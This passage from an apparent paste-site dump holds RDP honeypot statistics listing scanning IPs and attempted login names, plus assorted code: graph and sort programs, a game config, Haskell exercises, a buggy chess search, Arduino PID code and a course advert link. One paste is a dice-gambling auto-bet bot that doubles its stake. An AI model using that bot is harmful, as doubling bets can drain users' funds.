    ""194.165.16.73"": 12,
    ""62.204.41.107"": 12,
    ""87.251.75.64"": 3,
    ""81.19.135.147"": 3,
    ""205.210.31.64"": 9,
    ""185.161.248.148"": 3,
    ""142.4.218.114"": 3,
    ""61.91.43.232"": 3
  },
  ""asn"": {
    ""AS16276"": 6,
    ""AS398324"": 3,
    ""AS396982"": 36,
    ""AS208091"": 21,
    ""AS48721"": 18,
    ""AS49581"": 6,
    ""AS204428"": 12,
    ""AS4134"": 9,
    ""AS267784"": 6,
    ""AS10439"": 30,
    ""AS197414"": 3,
    ""AS62240"": 6,
    ""AS7713"": 6,
    ""AS63949"": 18,
    ""AS14061"": 3,
    ""AS56040"": 3,
    ""AS59187"": 6,
    ""AS9304"": 9,
    ""AS135377"": 3,
    ""AS45899"": 15,
    ""AS59425"": 12,
    ""AS209588"": 3,
    ""AS49202"": 3,
    ""AS7470"": 3
  },
  ""isp"": {
    ""OVH Singapore PTE. LTD"": 3,
    ""Censys, Inc."": 3,
    ""Google LLC"": 36,
    ""Xhost Internet Solutions LP"": 24,
    ""Flyservers S.A."": 27,
    ""Ferdinand Zink trading as Tube-Hosting"": 6,
    ""SS-Net"": 12,
    ""Chinanet"": 9,
    ""CariNet, Inc."": 30,
    ""LogicWeb Inc."": 3,
    ""Clouvider Limited"": 3,
    ""PT Telekomunikasi Indonesia"": 6,
    ""Akamai Technologies, Inc."": 18,
    ""DigitalOcean, LLC"": 3,
    ""China Mobile communications corporation"": 3,
    ""Neevai Supercloud PVT LTD"": 6,
    ""HGC Global Communications Limited"": 9,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""VNPT"": 15,
    ""Horizon LLC"": 12,
    ""Kisara LLC"": 3,
    ""OVH SAS"": 3,
    ""True Internet Corporation CO. Ltd."": 3
  },
  ""org"": {
    ""Patrice, Auffret"": 3,
    ""Censys, Inc"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Xhost Internet Solutions"": 21,
    ""Flyservers S.A"": 18,
    ""Taurus"": 6,
    ""4Media Ltd"": 12,
    ""Chinanet JS"": 9,
    ""UAB Host Baltic"": 6,
    ""CariNet, Inc."": 30,
    ""Xhostis"": 3,
    ""NSQ-VENTURE"": 3,
    ""IPXO"": 3,
    ""Telekomunikasi Indonesia"": 6,
    ""Linode"": 12,
    ""DigitalOcean, LLC"": 3,
    ""Akamai Technologies, Inc."": 6,
    ""China Mobile"": 3,
    ""Neevai Supercloud PVT LTD"": 6,
    ""HGC Global Communications Limited"": 9,
    ""Ucloud Information Technology"": 3,
    ""Vietnam Posts and Telecommunications Group"": 15,
    ""Horizon LLC"": 12,
    ""Alviva Holding Limited"": 3,
    ""Kisara LLC"": 3,
    ""OVH Hosting, Inc."": 3,
    ""True Internet Corporation CO. LTD"": 3
  },
  ""regionName"": {
    ""North West"": 3,
    ""Michigan"": 3,
    ""California"": 42,
    ""North Holland"": 24,
    ""Kaunas"": 18,
    ""Lombardy"": 6,
    ""Plovdiv"": 12,
    ""Jiangsu"": 9,
    ""Vilnius"": 6,
    ""Nevada"": 30,
    ""New Jersey"": 3,
    ""Jakarta"": 6,
    ""Texas"": 12,
    ""Florida"": 3,
    ""Tamil Nadu"": 3,
    ""Guangdong"": 3,
    ""Madhya Pradesh"": 6,
    ""Eastern"": 9,
    ""Moscow"": 18,
    ""Haiphong"": 15,
    ""Hesse"": 3,
    ""Quebec"": 3,
    ""Bangkok"": 3
  },
  ""country"": {
    ""Singapore"": 3,
    ""United States"": 93,
    ""The Netherlands"": 24,
    ""Lithuania"": 24,
    ""Italy"": 6,
    ""Bulgaria"": 12,
    ""China"": 12,
    ""Indonesia"": 6,
    ""India"": 9,
    ""Hong Kong"": 9,
    ""Russia"": 18,
    ""Vietnam"": 15,
    ""Germany"": 3,
    ""Canada"": 3,
    ""Thailand"": 3
  },
  ""account"": {
    ""Administrator"": 9,
    ""(empty)"": 15,
    ""shkMHVXPZ"": 3,
    ""aJyhYf"": 3,
    ""WhZSJt"": 3,
    ""Administr"": 42,
    ""Test"": 30,
    ""hello"": 42,
    ""eltons"": 15,
    ""administr"": 15,
    ""b3flladz"": 12,
    ""beio"": 3,
    ""TahiJrPPo"": 3,
    ""AJxsOO"": 3,
    ""xQnzIy"": 3,
    ""Domain"": 21,
    ""ChcFiEPdP"": 3,
    ""FPuuvg"": 3,
    ""sDhSdr"": 3,
    ""AlkDqyzxW"": 3,
    ""WNVdCr"": 3,
    ""YFLdKJ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 240
  },
  ""client_build"": {
    ""Unknown"": 240
  },
  ""client_name"": {
    ""Unknown"": 240
  },
  ""ip_type"": {
    ""hosting"": 93,
    ""Unknown"": 135,
    ""hosting & proxy"": 6,
    ""mobile & hosting"": 3,
    ""mobile"": 3
  }
}"
nditGK0D,2024-02-19_stats.json,rdp_snitch,JSON,Monday 19th of February 2024 06:16:08 PM CDT,"{
  ""ip"": {
    ""15.235.189.147"": 2,
    ""167.94.138.125"": 2,
    ""205.210.31.104"": 6,
    ""87.251.75.145"": 8,
    ""194.165.16.10"": 4,
    ""45.137.201.204"": 4,
    ""212.70.149.142"": 8,
    ""58.218.204.183"": 6,
    ""45.227.254.55"": 4,
    ""71.6.134.231"": 20,
    ""185.170.144.3"": 2,
    ""173.239.214.30"": 2,
    ""216.24.210.224"": 2,
    ""36.91.222.100"": 4,
    ""50.116.29.148"": 8,
    ""206.189.79.124"": 2,
    ""172.233.185.111"": 2,
    ""205.210.31.234"": 6,
    ""172.235.28.154"": 2,
    ""87.251.75.179"": 4,
    ""120.240.145.8"": 2,
    ""103.192.198.60"": 4,
    ""210.3.96.246"": 6,
    ""152.32.228.20"": 2,
    ""14.232.77.71"": 10,
    ""205.210.31.97"": 6,
    ""194.165.16.73"": 8,
    ""62.204.41.107"": 8,
    ""87.251.75.64"": 2,
    ""81.19.135.147"": 2,
    ""205.210.31.64"": 6,
    ""185.161.248.148"": 2,
    ""142.4.218.114"": 2,
    ""61.91.43.232"": 2
  },
  ""asn"": {
    ""AS16276"": 4,
    ""AS398324"": 2,
    ""AS396982"": 24,
    ""AS208091"": 14,
    ""AS48721"": 12,
    ""AS49581"": 4,
    ""AS204428"": 8,
    ""AS4134"": 6,
    ""AS267784"": 4,
    ""AS10439"": 20,
    ""AS197414"": 2,
    ""AS62240"": 4,
    ""AS7713"": 4,
    ""AS63949"": 12,
    ""AS14061"": 2,
    ""AS56040"": 2,
    ""AS59187"": 4,
    ""AS9304"": 6,
    ""AS135377"": 2,
    ""AS45899"": 10,
    ""AS59425"": 8,
    ""AS209588"": 2,
    ""AS49202"": 2,
    ""AS7470"": 2
  },
  ""isp"": {
    ""OVH Singapore PTE. LTD"": 2,
    ""Censys, Inc."": 2,
    ""Google LLC"": 24,
    ""Xhost Internet Solutions LP"": 16,
    ""Flyservers S.A."": 18,
    ""Ferdinand Zink trading as Tube-Hosting"": 4,
    ""SS-Net"": 8,
    ""Chinanet"": 6,
    ""CariNet, Inc."": 20,
    ""LogicWeb Inc."": 2,
    ""Clouvider Limited"": 2,
    ""PT Telekomunikasi Indonesia"": 4,
    ""Akamai Technologies, Inc."": 12,
    ""DigitalOcean, LLC"": 2,
    ""China Mobile communications corporation"": 2,
    ""Neevai Supercloud PVT LTD"": 4,
    ""HGC Global Communications Limited"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""VNPT"": 10,
    ""Horizon LLC"": 8,
    ""Kisara LLC"": 2,
    ""OVH SAS"": 2,
    ""True Internet Corporation CO. Ltd."": 2
  },
  ""org"": {
    ""Patrice, Auffret"": 2,
    ""Censys, Inc"": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""Xhost Internet Solutions"": 14,
    ""Flyservers S.A"": 12,
    ""Taurus"": 4,
    ""4Media Ltd"": 8,
    ""Chinanet JS"": 6,
    ""UAB Host Baltic"": 4,
    ""CariNet, Inc."": 20,
    ""Xhostis"": 2,
    ""NSQ-VENTURE"": 2,
    ""IPXO"": 2,
    ""Telekomunikasi Indonesia"": 4,
    ""Linode"": 8,
    ""DigitalOcean, LLC"": 2,
    ""Akamai Technologies, Inc."": 4,
    ""China Mobile"": 2,
    ""Neevai Supercloud PVT LTD"": 4,
    ""HGC Global Communications Limited"": 6,
    ""Ucloud Information Technology"": 2,
    ""Vietnam Posts and Telecommunications Group"": 10,
    ""Horizon LLC"": 8,
    ""Alviva Holding Limited"": 2,
    ""Kisara LLC"": 2,
    ""OVH Hosting, Inc."": 2,
    ""True Internet Corporation CO. LTD"": 2
  },
  ""regionName"": {
    ""North West"": 2,
    ""Michigan"": 2,
    ""California"": 28,
    ""North Holland"": 16,
    ""Kaunas"": 12,
    ""Lombardy"": 4,
    ""Plovdiv"": 8,
    ""Jiangsu"": 6,
    ""Vilnius"": 4,
    ""Nevada"": 20,
    ""New Jersey"": 2,
    ""Jakarta"": 4,
    ""Texas"": 8,
    ""Florida"": 2,
    ""Tamil Nadu"": 2,
    ""Guangdong"": 2,
    ""Madhya Pradesh"": 4,
    ""Eastern"": 6,
    ""Moscow"": 12,
    ""Haiphong"": 10,
    ""Hesse"": 2,
    ""Quebec"": 2,
    ""Bangkok"": 2
  },
  ""country"": {
    ""Singapore"": 2,
    ""United States"": 62,
    ""The Netherlands"": 16,
    ""Lithuania"": 16,
    ""Italy"": 4,
    ""Bulgaria"": 8,
    ""China"": 8,
    ""Indonesia"": 4,
    ""India"": 6,
    ""Hong Kong"": 6,
    ""Russia"": 12,
    ""Vietnam"": 10,
    ""Germany"": 2,
    ""Canada"": 2,
    ""Thailand"": 2
  },
  ""account"": {
    ""Administrator"": 6,
    ""(empty)"": 10,
    ""shkMHVXPZ"": 2,
    ""aJyhYf"": 2,
    ""WhZSJt"": 2,
    ""Administr"": 28,
    ""Test"": 20,
    ""hello"": 28,
    ""eltons"": 10,
    ""administr"": 10,
    ""b3flladz"": 8,
    ""beio"": 2,
    ""TahiJrPPo"": 2,
    ""AJxsOO"": 2,
    ""xQnzIy"": 2,
    ""Domain"": 14,
    ""ChcFiEPdP"": 2,
    ""FPuuvg"": 2,
    ""sDhSdr"": 2,
    ""AlkDqyzxW"": 2,
    ""WNVdCr"": 2,
    ""YFLdKJ"": 2
  },
  ""keyboard"": {
    ""Unknown"": 160
  },
  ""client_build"": {
    ""Unknown"": 160
  },
  ""client_name"": {
    ""Unknown"": 160
  },
  ""ip_type"": {
    ""hosting"": 62,
    ""Unknown"": 90,
    ""hosting & proxy"": 4,
    ""mobile & hosting"": 2,
    ""mobile"": 2
  }
}"
WAVu7anD,2024-02-19_stats.json,rdp_snitch,JSON,Monday 19th of February 2024 06:15:08 PM CDT,"{
  ""ip"": {
    ""15.235.189.147"": 1,
    ""167.94.138.125"": 1,
    ""205.210.31.104"": 3,
    ""87.251.75.145"": 4,
    ""194.165.16.10"": 2,
    ""45.137.201.204"": 2,
    ""212.70.149.142"": 4,
    ""58.218.204.183"": 3,
    ""45.227.254.55"": 2,
    ""71.6.134.231"": 10,
    ""185.170.144.3"": 1,
    ""173.239.214.30"": 1,
    ""216.24.210.224"": 1,
    ""36.91.222.100"": 2,
    ""50.116.29.148"": 4,
    ""206.189.79.124"": 1,
    ""172.233.185.111"": 1,
    ""205.210.31.234"": 3,
    ""172.235.28.154"": 1,
    ""87.251.75.179"": 2,
    ""120.240.145.8"": 1,
    ""103.192.198.60"": 2,
    ""210.3.96.246"": 3,
    ""152.32.228.20"": 1,
    ""14.232.77.71"": 5,
    ""205.210.31.97"": 3,
    ""194.165.16.73"": 4,
    ""62.204.41.107"": 4,
    ""87.251.75.64"": 1,
    ""81.19.135.147"": 1,
    ""205.210.31.64"": 3,
    ""185.161.248.148"": 1,
    ""142.4.218.114"": 1,
    ""61.91.43.232"": 1
  },
  ""asn"": {
    ""AS16276"": 2,
    ""AS398324"": 1,
    ""AS396982"": 12,
    ""AS208091"": 7,
    ""AS48721"": 6,
    ""AS49581"": 2,
    ""AS204428"": 4,
    ""AS4134"": 3,
    ""AS267784"": 2,
    ""AS10439"": 10,
    ""AS197414"": 1,
    ""AS62240"": 2,
    ""AS7713"": 2,
    ""AS63949"": 6,
    ""AS14061"": 1,
    ""AS56040"": 1,
    ""AS59187"": 2,
    ""AS9304"": 3,
    ""AS135377"": 1,
    ""AS45899"": 5,
    ""AS59425"": 4,
    ""AS209588"": 1,
    ""AS49202"": 1,
    ""AS7470"": 1
  },
  ""isp"": {
    ""OVH Singapore PTE. LTD"": 1,
    ""Censys, Inc."": 1,
    ""Google LLC"": 12,
    ""Xhost Internet Solutions LP"": 8,
    ""Flyservers S.A."": 9,
    ""Ferdinand Zink trading as Tube-Hosting"": 2,
    ""SS-Net"": 4,
    ""Chinanet"": 3,
    ""CariNet, Inc."": 10,
    ""LogicWeb Inc."": 1,
    ""Clouvider Limited"": 1,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Akamai Technologies, Inc."": 6,
    ""DigitalOcean, LLC"": 1,
    ""China Mobile communications corporation"": 1,
    ""Neevai Supercloud PVT LTD"": 2,
    ""HGC Global Communications Limited"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""VNPT"": 5,
    ""Horizon LLC"": 4,
    ""Kisara LLC"": 1,
    ""OVH SAS"": 1,
    ""True Internet Corporation CO. Ltd."": 1
  },
  ""org"": {
    ""Patrice, Auffret"": 1,
    ""Censys, Inc"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Xhost Internet Solutions"": 7,
    ""Flyservers S.A"": 6,
    ""Taurus"": 2,
    ""4Media Ltd"": 4,
    ""Chinanet JS"": 3,
    ""UAB Host Baltic"": 2,
    ""CariNet, Inc."": 10,
    ""Xhostis"": 1,
    ""NSQ-VENTURE"": 1,
    ""IPXO"": 1,
    ""Telekomunikasi Indonesia"": 2,
    ""Linode"": 4,
    ""DigitalOcean, LLC"": 1,
    ""Akamai Technologies, Inc."": 2,
    ""China Mobile"": 1,
    ""Neevai Supercloud PVT LTD"": 2,
    ""HGC Global Communications Limited"": 3,
    ""Ucloud Information Technology"": 1,
    ""Vietnam Posts and Telecommunications Group"": 5,
    ""Horizon LLC"": 4,
    ""Alviva Holding Limited"": 1,
    ""Kisara LLC"": 1,
    ""OVH Hosting, Inc."": 1,
    ""True Internet Corporation CO. LTD"": 1
  },
  ""regionName"": {
    ""North West"": 1,
    ""Michigan"": 1,
    ""California"": 14,
    ""North Holland"": 8,
    ""Kaunas"": 6,
    ""Lombardy"": 2,
    ""Plovdiv"": 4,
    ""Jiangsu"": 3,
    ""Vilnius"": 2,
    ""Nevada"": 10,
    ""New Jersey"": 1,
    ""Jakarta"": 2,
    ""Texas"": 4,
    ""Florida"": 1,
    ""Tamil Nadu"": 1,
    ""Guangdong"": 1,
    ""Madhya Pradesh"": 2,
    ""Eastern"": 3,
    ""Moscow"": 6,
    ""Haiphong"": 5,
    ""Hesse"": 1,
    ""Quebec"": 1,
    ""Bangkok"": 1
  },
  ""country"": {
    ""Singapore"": 1,
    ""United States"": 31,
    ""The Netherlands"": 8,
    ""Lithuania"": 8,
    ""Italy"": 2,
    ""Bulgaria"": 4,
    ""China"": 4,
    ""Indonesia"": 2,
    ""India"": 3,
    ""Hong Kong"": 3,
    ""Russia"": 6,
    ""Vietnam"": 5,
    ""Germany"": 1,
    ""Canada"": 1,
    ""Thailand"": 1
  },
  ""account"": {
    ""Administrator"": 3,
    ""(empty)"": 5,
    ""shkMHVXPZ"": 1,
    ""aJyhYf"": 1,
    ""WhZSJt"": 1,
    ""Administr"": 14,
    ""Test"": 10,
    ""hello"": 14,
    ""eltons"": 5,
    ""administr"": 5,
    ""b3flladz"": 4,
    ""beio"": 1,
    ""TahiJrPPo"": 1,
    ""AJxsOO"": 1,
    ""xQnzIy"": 1,
    ""Domain"": 7,
    ""ChcFiEPdP"": 1,
    ""FPuuvg"": 1,
    ""sDhSdr"": 1,
    ""AlkDqyzxW"": 1,
    ""WNVdCr"": 1,
    ""YFLdKJ"": 1
  },
  ""keyboard"": {
    ""Unknown"": 80
  },
  ""client_build"": {
    ""Unknown"": 80
  },
  ""client_name"": {
    ""Unknown"": 80
  },
  ""ip_type"": {
    ""hosting"": 31,
    ""Unknown"": 45,
    ""hosting & proxy"": 2,
    ""mobile & hosting"": 1,
    ""mobile"": 1
  }
}"
CQQ3XHhk,Untitled,Tkap1,C++,Monday 19th of February 2024 06:02:08 PM CDT,"

#include <vector>
#include <iostream>
#include <stdint.h>

using namespace std;

typedef uint32_t u32;
struct s_visited
{
	u32 a;
	u32 b;
	u32 index;
};

struct s_connection
{
	u32 a;
	u32 b;
};
vector<s_connection> connections = {};

bool has_path(u32 a, u32 b, vector<s_visited>* visited)
{
	for(u32 i = 0; i < connections.size(); i++) {
		s_connection c = connections[i];

		if((c.a == a && c.b == b) || (c.b == a && c.a == b)) { return true; }
		bool skip = false;
		for(u32 j = 0; j < visited->size(); j++) {
			s_visited v = visited->at(j);
			if(v.index == i && (v.a == a && v.b == b) || (v.b == a && v.a == b)) {
				skip = true;
				break;
			}
		}
		if(skip) { continue; }
		visited->push_back({a, b, i});

		if(c.a == a) {
			if(has_path(c.b, b, visited)) { return true; }
		}

		if(c.b == a) {
			if(has_path(c.a, b, visited)) { return true; }
		}
	}

	return false;
}

int main()
{
	u32 cities;
	u32 roads;
	cin >> cities >> roads;
	for(u32 i = 0; i < roads; i++) {
		u32 a;
		u32 b;
		cin >> a >> b;
		connections.push_back({a, b});
	}

	u32 curr = 1;
	vector<s_connection> added = {};
	for(u32 i = 0; i < cities; i++) {
		u32 ii = i + 1;
		if(curr == ii) { continue; }
		vector<s_visited> visited = {};
		if(!has_path(curr, ii, &visited)) {
			connections.push_back({curr, ii});
			added.push_back({curr, ii});
		}
		curr += 1;
	}
	printf(""%zu\n"", added.size());
	for(u32 i = 0; i < added.size(); i++) {
		printf(""%i %i\n"", added[i].a, added[i].b);
	}
	return 0;
}
"
jj6K9TKG,new monster bot snowy made,coinwalk,JavaScript,Monday 19th of February 2024 05:29:41 PM CDT,"var original = parseFloat(document.getElementById('pct_balance').value);
var dockiez = original;
var base = 0.00001;
var tens = (base*10);
var sevens = (base*6.9);
var eights = (base*7.9);
var snotty = base;
var bibble = original;
var mate = original;
var fran = ((Math.floor(original/tens))*tens);
var jerk = ((Math.floor(original/tens))*tens);
var dude = 100000000000000000000000000;
var filfy = 0;
var freak = true;
 
function dobet(){
bibble = document.getElementById('pct_balance').value;
    if ((bibble>=(((Math.floor(bibble/tens))*tens)+sevens))&&(bibble<(((Math.floor(bibble/tens))*tens)+eights))&&(bibble!=filfy)){
        snotty = snotty+snotty;
        filfy = parseFloat(bibble);
    } 
    if (bibble>mate){
        mate = parseFloat(bibble);
    }
    if ((snotty>=(base*4))&&(freak)&&(bibble>=mate)){
        dude = ((Math.ceil(bibble/tens))*tens);
        freak = false;
    }
    if ((snotty>=(base*4))&&(bibble>=dude)&&(bibble<(((Math.floor(bibble/tens))*tens)+sevens))){
        freak = true;
        dude = 100000000000000000000000000;
        filfy = 0; 
        snotty = base
        mate = parseFloat(bibble);
    }
    if ((snotty*3)>=(bibble-snotty)){
        freak = true;
        dude = 100000000000000000000000000;
        filfy = 0; 
        snotty = base
        mate = parseFloat(bibble);
    }
    if (bibble>=(dockiez*24)){
 console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((snotty*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => dobet(), 1000);
} 
dobet();
"
1dP87rnG,Untitled,sissou123,C#,Monday 19th of February 2024 05:00:18 PM CDT,"C# Basics for Beginners: Learn C# Fundamentals by Coding
Master C# fundamentals in 6 hours - The most popular course with 50,000+ students, packed with tips and exercises! 
What you'll learn
Learn the fundamentals of C# and .NET Framework
Work with primitive types and expressions
Work with non-primitive types (classes, structs, arrays and enums) 
for more:https://cuty.io/3RE1
"
Axgv3jvx,sort test,bartekltg,C++,Monday 19th of February 2024 04:17:51 PM CDT,"#include <iostream>
#include <random>
#include <algorithm>
#include <chrono>

using namespace std;



class timer{
    std::chrono::time_point<std::chrono::high_resolution_clock> a,b;
public:
    void start(){a = std::chrono::high_resolution_clock::now();}
    void stop() {b = std::chrono::high_resolution_clock::now();}
    double value()
    {
        std::chrono::duration<double> elapsed_seconds = b-a;
        return elapsed_seconds.count();
    }
};

int main()
{
    const size_t N = 120'000'000;
    vector<uint64_t> tab;
    random_device rd;
    mt19937_64 gen(rd());

    uniform_int_distribution<uint64_t> dist(0);


    for (int i=0; i<5; i++){
        generate_n(back_inserter(tab), N, [&](){ return  dist(gen) ; } ) ;
        timer st;
        st.start();
        sort(begin(tab),end(tab));
        st.stop();
        cout<<tab[3]<<endl; //do not optimize the array out, please
        cout<<is_sorted(begin(tab),end(tab))<<endl;
        cout<<st.value()*1000<<"" ms""<<endl;
        tab.clear();
    }
    return 0;
}
"
wiLVBFew,Alits Life Factories Config,zkb1325,C#,Monday 19th of February 2024 04:08:14 PM CDT,"class FactorySettings {
    mapIcon = ""loc_Stack"";
    mapIconColor = ""ColorYellow"";
    continueProductionQueueOffline = 1; //1 = true, 0 = false. If the production queue will continue even if the player is offline or if the server is down.
};

class Factories {
    class ExampleFactory {
        objectVar = ""ExampleFactory""; // If you do not place an object in the editor and set the variable name to this then this factory will not show up
        displayName = ""Example Factory"";
        factoryCost = 10000;
        maxWorkers = 10;
        workerCost = 1000;
        manufactureTime = ""300/_workerCount"";

        class Items {
            class Iron {
                required[] = {{""iron_unrefined"", 1}};
                output[] = {{""iron_refined"", 1}};
                manufactureTime = ""20""; // Manufacturing 1 item will take 1 minute since it gets rounded up to the nearest minute, it would be better use of time to manufacture in multiples of 3
            };
            class Copper {
                required[] = {{""copper_unrefined"", 1}};
                output[] = {{""copper_refined"", 1}};
            };
            class Glass {
                required[] = {{""sand"", 2}};
                output[] = {{""glass"", 1}};
            };
            class U_C_WorkerCoveralls {
                required[] = {{""iron_refined"", 1}};
                output[] = {{""U_C_WorkerCoveralls"", 1}};
                manufactureTime = ""60"";
            };
            class H_BandMask_blk {
                required[] = {{""iron_refined"", 1}};
                output[] = {{""H_BandMask_blk"", 1}};
                manufactureTime = ""60"";
            };
            class G_Combat {
                required[] = {{""iron_refined"", 1}};
                output[] = {{""G_Combat"", 1}};
                manufactureTime = ""60"";
            };
            class V_TacVest_blk_POLICE {
                displayName = ""Police Vest"";
                required[] = {{""iron_refined"", 1}};
                output[] = {{""V_TacVest_blk_POLICE"", 1}};
                manufactureTime = ""60"";
            };
            class B_Carryall_ocamo {
                required[] = {{""iron_refined"", 1}};
                output[] = {{""B_Carryall_ocamo"", 1}};
                manufactureTime = ""60"";
            };
            class arifle_SPAR_01_blk_F {
                required[] = {{""iron_refined"", 2}};
                output[] = {{""arifle_SPAR_01_blk_F"", 1}};
                manufactureTime = ""1000/_workerCount"";
            };
            class 30Rnd_556x45_Stanag {
                required[] = {{""copper_refined"", 1}};
                output[] = {{""30Rnd_556x45_Stanag"", 1}};
            };
            class optic_Hamr {
                required[] = {{""iron_refined"", 1}, {""glass"", 1}};
                output[] = {{""optic_Hamr"", 2}};
            };
            class C_Offroad_02_unarmed_F {
                required[] = {{""iron_refined"", 10}, {""glass"", 4}};
                output[] = {{""C_Offroad_02_unarmed_F"", 1}};
                manufactureTime = ""45*60""; // 45 minute manufacture time
            };
            class Recycle_C_Offroad_02_unarmed_F {
                displayName = ""Recycle Vehicle"";
                icon = ""\A3\ui_f\data\map\markers\military\objective_CA.paa"";
                required[] = {{""C_Offroad_02_unarmed_F"", 1}};
                output[] = {{""iron_refined"", 10}, {""glass"", 4}};
                manufactureTime = ""1""; // Even though it's set to 1 second it will get rounded up to 1 minute
            };
        };
    };
};"
68AqrFSR,Ninety-Nine Haskell Problems: Problem 2,banovski,Haskell,Monday 19th of February 2024 03:53:22 PM CDT,"l = [0 .. 9]

one xs = xs !! (length xs - 2)

two xs = reverse xs !! 1

three = aux
  where
    aux [x,y] = x
    aux (x:xs) = aux xs

four xs = aux xs (length xs)
  where
    aux xs 2 = head xs
    aux (x:xs) l = aux xs (l - 1)

five xs = snd . head . filter (\(x, _) -> x == 1) $ zip (reverse xs) [0 ..]

six = head . tail . reverse

seven = last . init
"
ejVtz8AR,upwards propagation of a chess endgame,max2201111,Python,Monday 19th of February 2024 03:45:56 PM CDT,"import chess
import time
import threading

def is_white_turn(fen):
    """"""Determines if it's White's turn given a FEN string.""""""
    return fen.split()[1] == 'w'

def initialize_game_tree(initial_fen):
    """"""Initializes the game tree with the root node based on the initial FEN.""""""
    return {
        1: {
            'fen': initial_fen,
            'moves_to_mate': None,
            'parent': None,
            'color': chess.WHITE if is_white_turn(initial_fen) else chess.BLACK,
            'result': None,
            'processed': False,
            'sequence': [],
            'up': False,
        }
    }

def generate_descendants(game_tree, key):
    """"""Generates all legal move descendants for a node in the game tree.""""""
    node = game_tree[key]
    board = chess.Board(node['fen'])
    for move in board.legal_moves:
        board.push(move)
        new_key = max(game_tree.keys()) + 1
        game_tree[new_key] = {
            'fen': board.fen(),
            'moves_to_mate': None,
            'parent': key,
            'color': not node['color'],
            'result': None,
            'processed': False,
            'sequence': node['sequence'] + [move.uci()],
            'up': False,
        }
        board.pop()

def evaluate_terminal_positions(game_tree):
    """"""Evaluates terminal positions in the game tree, updating nodes with results.""""""
    for key, node in game_tree.items():
        board = chess.Board(node['fen'])
        if board.is_checkmate():
            node['moves_to_mate'] = 0
            node['result'] = 1 if node['color'] == chess.BLACK else 0
            node['processed'] = True
        elif board.is_stalemate() or board.is_insufficient_material() or board.can_claim_threefold_repetition() or board.can_claim_fifty_moves() or board.is_seventyfive_moves() or board.is_fivefold_repetition():
            node['moves_to_mate'] = 0
            node['result'] = 0.5
            node['processed'] = True

def propagate_results_upwards(game_tree):
    """"""Propagates results upwards in the game tree to update parent nodes.""""""
    for key in reversed(list(game_tree.keys())):
        node = game_tree[key]
        if node['parent'] is not None:
            parent_node = game_tree[node['parent']]
            if parent_node['result'] is None or (node['result'] is not None and node['result'] > parent_node['result']):
                parent_node['result'] = node['result']
                parent_node['up'] = True

def format_time(seconds):
    """"""Formats elapsed time into hours, minutes, and seconds.""""""
    return f""{int(seconds // 3600)}h {(int(seconds) % 3600) // 60}m {seconds % 60:.2f}s""

def update_display(start_time, game_tree):
    """"""Updates the display with elapsed time, searched nodes, and current depth.""""""
    while True:
        time_elapsed = time.time() - start_time
        current_depth = max([len(node['sequence']) for node in game_tree.values()], default=0)
        # Use ANSI escape code to clear the line before printing
        print(f""\r\033[KTime: {format_time(time_elapsed)}, Searched nodes: {len(game_tree)}, Current depth: {current_depth}"", end='', flush=True)
        time.sleep(1)

def process_node(game_tree, key):
    """"""Processes a single node: generates descendants, evaluates, and propagates results.""""""
    generate_descendants(game_tree, key)
    evaluate_terminal_positions(game_tree)
    propagate_results_upwards(game_tree)
    game_tree[key]['processed'] = True

if __name__ == ""__main__"":
    initial_fen = ""8/8/2k5/4K3/7p/8/8/8 w - - 0 1""
    game_tree = initialize_game_tree(initial_fen)
    start_time = time.time()

    display_thread = threading.Thread(target=update_display, args=(start_time, game_tree,))
    display_thread.daemon = True
    display_thread.start()

    max_depth = 5
    nodes_processed = 0
    max_nodes = 1000

    keys_to_process = [1]

    while keys_to_process and nodes_processed < max_nodes:
        key = keys_to_process.pop(0)
        if len(game_tree[key]['sequence']) < max_depth:
            process_node(game_tree, key)
            nodes_processed += 1
            keys_to_process.extend([new_key for new_key, node in game_tree.items() if not node['processed']])

    print(f""\nExploration completed. A: {A[1]}"")"
3R9Vc3b8,Piec Kamila,Sempol,C,Monday 19th of February 2024 03:41:14 PM CDT,"#include <Wire.h>
#include <LiquidCrystal_I2C.h>
#include <Servo.h>
#include <PID_v1.h>

// Definicja struktury ramki danych
#pragma pack(push, 1)
struct DataFrame {
  byte startSequence[6]; // Początek ramki
  byte data[29];         // Pozostałe dane
};
#pragma pack(pop)

// Deklaracje dla Hardware Serial
LiquidCrystal_I2C lcd(0x27, 16, 2); // Adres I2C wyświetlacza LCD

// Komendy inicjalizacyjne i żądania danych
const byte initCommands[3][8] = {
  {0xAC, 0x00, 0x00, 0x04, 0x00, 0x00, 0x4C, 0xFC},
  {0x4C, 0x00, 0x00, 0x03, 0x49, 0xFF, 0xE7},
  {0x4C, 0x00, 0x00, 0x03, 0x64, 0x00, 0xB3}
};
const byte dataRequestCommand[] = {0x4C, 0x00, 0x00, 0x03, 0x64, 0x00, 0xB3};

// Deklaracje dla PID
Servo myservo;
int servoPin = 9;
double Setpoint, Input, Output;
double Kp = 2.6, Ki = 0.28, Kd = 3.0;
double integral, lastInput;
double outputMin = 0, outputMax = 100;

bool pidEnabled = false;
unsigned long pidStartTime;

void setup() {
  Serial.begin(57600);
  Wire.begin();
  lcd.init();
  lcd.backlight();
  
  myservo.attach(servoPin);

  // Czekaj 1 minutę (60 sekund) przed wysłaniem komend inicjalizacyjnych
  lcd.clear();
  lcd.print(""Siem tu burcz wry"");
  unsigned long startTime = millis();

  while (millis() - startTime < 75000) {
    //myservo.attach(servoPin);
    myservo.write(150);
  }

  pidEnabled = true;
  pidStartTime = millis();

  for (int i = 0; i < 3; i++) {
    sendCommand(initCommands[i], 8);
    delay(100);
  }
  lcd.clear();
  lcd.print(""Inicjacja..."");

  //myservo.detach(); // Odłącz serwo po zakończeniu ustawiania na 140 stopni
  Setpoint = 5.0; // Początkowa wartość punktu docelowego
}

void loop() {
  sendCommand(dataRequestCommand, sizeof(dataRequestCommand));
  byte buffer[sizeof(DataFrame)];
  size_t index = 0;
  bool startFrameDetected = false;
  unsigned long startTime = millis();

  while ((millis() - startTime) < 600 && index < sizeof(buffer)) {
    if (Serial.available()) {
